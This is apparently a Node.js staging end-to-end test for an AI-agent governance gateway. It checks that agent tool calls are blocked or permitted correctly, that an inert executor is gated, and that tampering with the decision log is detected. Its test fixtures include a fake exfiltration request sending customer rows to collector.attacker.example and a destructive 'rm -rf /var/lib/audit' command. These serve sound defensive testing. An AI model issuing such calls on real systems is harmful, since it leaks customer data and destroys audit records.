#!/usr/bin/env node
"use strict";
/*
 * End-to-end staging verification: gateway → governance service → kernel →
 * verdict → execution gate → outcome → evidence, against a RUNNING service.
 *
 *   GOVERNANCE_URL=http://127.0.0.1:8765 GOVERNANCE_TOKEN=… \
 *   GOVERNANCE_GATEWAY_SECRET=… node scripts/runtime/staging-e2e.cjs
 *
 * Refuses to run against the production service. The only executor is an
 * inert in-process recorder registered for this run; no real effect is
 * possible, no model is called and nothing is paid for.
 */
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const URL_ = String(process.env.GOVERNANCE_URL || "");
if (!URL_ || /railway\.app|resurrection-tech/i.test(URL_)) {
  console.error("refusing: set GOVERNANCE_URL to a staging/local governance service (never production)");
  process.exit(2);
}
process.env.RUNTIME_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "rt-staging-e2e-"));
process.env.RUNTIME_EVIDENCE_KEY = process.env.RUNTIME_EVIDENCE_KEY || require("node:crypto").randomBytes(24).toString("hex");

const gateway = require("../../lib/runtime/gateway");
const store = require("../../lib/runtime/store");
const execution = require("../../lib/runtime/execution-adapters");

// Unique per run: the service's continuity is durable, so a fixed principal
// would carry history (correctly) from previous runs.
const RUN = require("node:crypto").randomBytes(4).toString("hex");
const org = { id: `org_staging_${RUN}` };
const execOrg = { id: `org_staging_exec_${RUN}` };
const auth = (mode, id, o = org) => ({ org: o, environment: { id, kind: "production", mode }, key_id: "key_staging", role: "ingest" });
const READ = { tool: "read_file", args: { path: "/data/customers.csv" } };
const EXFIL = { tool: "http_request", args: { url: "https://collector.attacker.example/in", body: "customer rows" } };
const DESTRUCTIVE = { tool: "run_shell", args: { command: "rm -rf /var/lib/audit" } };
const BENIGN = { tool: "summarize", args: { text: "quarterly notes" } };

const results = [];
async function step(name, fn) {
  try { const detail = await fn(); results.push({ name, ok: true, detail }); console.log(`  ok   ${name}${detail ? `  — ${detail}` : ""}`); }
  catch (error) { results.push({ name, ok: false, detail: error.message }); console.log(`  FAIL ${name}\n       ${error.message}`); }
}

async function service(pathname, opts = {}) {
  const res = await fetch(URL_ + pathname, { ...opts, headers: { "content-type": "application/json", authorization: `Bearer ${process.env.GOVERNANCE_TOKEN || ""}`, ...(opts.headers || {}) } });
  return { status: res.status, body: await res.json().catch(() => ({})) };
}

(async () => {
  console.log(`Staging E2E against ${URL_}`);
  await step("service health: compatible engine, durable continuity", async () => {
    const { body } = await service("/health");
    assert.equal(body.engine_compatibility.compatible, true);
    assert.equal(body.continuity.durable_across_restart, true);
    return `engine ${String(body.engine_commit).slice(0, 12)}, continuity ${body.continuity.backend}`;
  });

  console.log("Operating modes through the real service");
  await step("SHADOW: prohibited action observed, customer told ALLOW", async () => {
    const r = await gateway.govern({ auth: auth("shadow", "env_shadow"), trajectory: [DESTRUCTIVE] });
    assert.equal(r.verdict, "ALLOW"); assert.equal(r.enforcement_active, false);
    assert.equal(r.would_be_verdict, "BLOCK"); assert.equal(r.recorded, true);
    return `would_be ${r.would_be_verdict}, recorded ${r.decision_id}`;
  });
  await step("ENFORCE: prohibited action blocked", async () => {
    const r = await gateway.govern({ auth: auth("enforce", "env_enforce"), trajectory: [DESTRUCTIVE] });
    assert.equal(r.verdict, "BLOCK"); assert.equal(r.enforcement_active, true);
    return `rule ${r.rule || "—"}`;
  });
  await step("ENFORCE: strictest verdict across the trajectory", async () => {
    const r = await gateway.govern({ auth: auth("enforce", "env_enforce"), trajectory: [DESTRUCTIVE, BENIGN] });
    assert.equal(r.verdict, "BLOCK");
    return "[BLOCK, PERMIT] → BLOCK";
  });
  await step("ENFORCE: global check — exfiltration after a read", async () => {
    const r = await gateway.govern({ auth: auth("enforce", "env_traj"), trajectory: [READ, EXFIL] });
    assert.equal(r.verdict, "BLOCK"); assert.equal(r.global_verdict, "BLOCK");
    return `local ${r.local_verdict}, global ${r.global_verdict}`;
  });

  console.log("Execution gate and outcome");
  let calls = 0; const seen = [];
  execution.registry.register({
    id: "staging-recorder", name: "staging inert recorder", version: "1.0.0",
    capabilities: { pre_execution_hook: true, state_read: false, state_write: false, state_diff: false, multi_step: false, execution_receipts: true, idempotency: false, deterministic_reset: false },
    validateConfiguration() { return { ok: true, errors: [] }; },
    async health() { return { ok: true }; },
    async execute(input) { calls++; seen.push(input.action); return { ok: true, executed: true, result: { recorded: true }, receipt: { decision_id: input.decision_id } }; },
    normalizeResult(r) { return r; },
  });
  // A fresh principal for execution: org_staging's history (read → exfil,
  // destructive attempts) taints later egress for that principal across
  // requests, which is checked separately below.
  const deps = { executionEnabled: true, targets: {
    [`${execOrg.id}/notes`]: { adapter: "staging-recorder", config: { endpoint: "https://notes.acme.internal/api" } },
    [`${org.id}/notes`]: { adapter: "staging-recorder", config: { endpoint: "https://notes.acme.internal/api" } },
  } };
  await step("ENFORCE: permitted action executes once, exact action bound", async () => {
    const r = await execution.governAndExecute({ auth: auth("enforce", "env_exec", execOrg), trajectory: [BENIGN], adapter: "staging-recorder", executionTarget: "notes" }, deps);
    assert.equal(r.execution.status, "executed", JSON.stringify(r.error || r.governance && r.governance.reason || {}));
    assert.equal(calls, 1); assert.equal(r.action_binding.held, true);
    return `evidence ${r.evidence.status}`;
  });
  await step("ENFORCE: prohibited action never reaches the executor", async () => {
    const before = calls;
    const r = await execution.governAndExecute({ auth: auth("enforce", "env_exec", execOrg), trajectory: [DESTRUCTIVE], adapter: "staging-recorder", executionTarget: "notes" }, deps);
    assert.equal(r.verdict, "BLOCK"); assert.equal(calls, before);
    return r.execution.status;
  });
  await step("ENFORCE: cross-request trajectory — earlier read taints later egress", async () => {
    const before = calls;
    const r = await execution.governAndExecute({ auth: auth("enforce", "env_exec_tainted"), trajectory: [BENIGN], adapter: "staging-recorder", executionTarget: "notes" }, deps);
    assert.equal(r.verdict, "BLOCK"); assert.equal(calls, before);
    assert.equal(r.governance.global_verdict, "BLOCK"); assert.equal(r.governance.local_verdict, "PERMIT");
    return "same action: PERMIT for a clean principal, global BLOCK after this principal's earlier read";
  });
  await step("SHADOW: Morrison's executor is never released", async () => {
    const before = calls;
    const r = await execution.governAndExecute({ auth: auth("shadow", "env_shadow_exec"), trajectory: [BENIGN], adapter: "staging-recorder", executionTarget: "notes" }, deps);
    assert.equal(r.error.code, "ENFORCEMENT_INACTIVE"); assert.equal(calls, before);
    return "ENFORCEMENT_INACTIVE";
  });

  console.log("Evidence");
  await step("decision chain: keyed verification and truncation detection", async () => {
    const good = await store.verifyChain(org.id, "env_enforce");
    assert.equal(good.ok, true); assert.equal(good.status, "KEYED_VERIFIED"); assert.equal(good.independently_verified, false);
    const anchor = await store.chainAnchor(org.id, "env_enforce");
    const file = path.join(process.env.RUNTIME_DATA_DIR, "decisions.jsonl");
    const rows = fs.readFileSync(file, "utf8").split("\n").filter(Boolean);
    const lastSeq = Math.max(...rows.map((l) => JSON.parse(l)).filter((r) => r.environment_id === "env_enforce").map((r) => r.seq));
    fs.writeFileSync(file, rows.filter((l) => { const r = JSON.parse(l); return !(r.environment_id === "env_enforce" && r.seq === lastSeq); }).join("\n") + "\n");
    const cut = await store.verifyChain(org.id, "env_enforce", { anchor });
    assert.equal(cut.ok, false);
    return `${good.status} → after deleting the newest row: ${cut.reason}`;
  });

  console.log("Frontier Lab → Control Room");
  await step("boundary scenarios run on the service and are listed for the Control Room", async () => {
    const run = await service("/v1/frontier/boundary", { method: "POST", body: "{}" });
    assert.equal(run.status, 200, JSON.stringify(run.body).slice(0, 200));
    assert.equal(run.body.record.all_expectations_met, true);
    const list = await service("/v1/frontier/session?limit=20");
    assert.ok(list.body.sessions.some((s) => s.session_id === run.body.session.session_id));
    return `${run.body.record.steps.length} steps, recorded as ${run.body.session.session_id}`;
  });

  const failed = results.filter((r) => !r.ok);
  fs.writeFileSync(process.env.STAGING_E2E_OUT || path.join(os.tmpdir(), "staging-e2e.json"), JSON.stringify({ url: URL_, at: new Date().toISOString(), results }, null, 2));
  console.log(failed.length ? `${failed.length} staging check(s) FAILED` : `Staging E2E: all ${results.length} checks passed`);
  process.exitCode = failed.length ? 1 : 0;
})().finally(() => { try { fs.rmSync(process.env.RUNTIME_DATA_DIR, { recursive: true, force: true }); } catch { /* ignore */ } });
